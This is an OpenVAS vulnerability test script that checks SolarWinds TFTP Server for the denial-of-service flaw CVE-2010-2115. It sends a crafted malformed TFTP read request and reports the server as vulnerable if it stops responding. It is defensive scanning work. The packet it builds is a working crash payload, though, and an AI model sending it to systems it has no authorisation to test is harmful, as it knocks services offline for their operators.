###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_SolarWinds_TFTP_40333.nasl 5373 2017-02-20 16:27:48Z teissa $
#
# SolarWinds TFTP Server 'Read' Request (Opcode 0x01) Denial Of Service Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100653");
 script_version("$Revision: 5373 $");
 script_tag(name:"last_modification", value:"$Date: 2017-02-20 17:27:48 +0100 (Mon, 20 Feb 2017) $");
 script_tag(name:"creation_date", value:"2010-05-25 13:42:13 +0200 (Tue, 25 May 2010)");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_cve_id("CVE-2010-2115");
 script_bugtraq_id(40333);

 script_name("SolarWinds TFTP Server 'Read' Request (Opcode 0x01) Denial Of Service Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/40333");
 script_xref(name : "URL" , value : "http://solarwinds.net/Tools/Free_tools/TFTP_Server/index.htm");

 script_category(ACT_DENIAL);
 script_family("Denial of Service");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("tftpd_detect.nasl");
 script_require_udp_ports("Services/udp/tftp");
 script_tag(name : "summary" , value : "SolarWinds TFTP Server is prone to a denial-of-service
 vulnerability.");
 script_tag(name : "impact" , value : "A successful exploit can allow attackers to crash the server process,
 resulting in a denial-of-service condition.");
 script_tag(name : "affected" , value : "SolarWinds TFTP Server 10.4.0.10 is vulnerable; other versions may
 also be affected.");

 script_tag(name:"qod_type", value:"remote_vul");
 exit(0);
}

include("tftp.inc");

if(safe_checks())exit(0);

port = get_kb_item('Services/udp/tftp');
if (! port) port = 69;
if (get_kb_item('tftp/'+port+'/backdoor')) exit(0);

if ( tftp_alive(port: port) ) {

  soc = open_sock_udp(port);
  if(!soc)exit(0);

  req = raw_string(0x00,0x01,0x01,0x00) + "NETASCII" + raw_string(0x00);
  send(socket:soc, data:req);
  close(soc);

  if(!tftp_alive(port: port)) {
    security_message(port:port,proto:"udp");
    exit(0);
   }
}

exit(99);
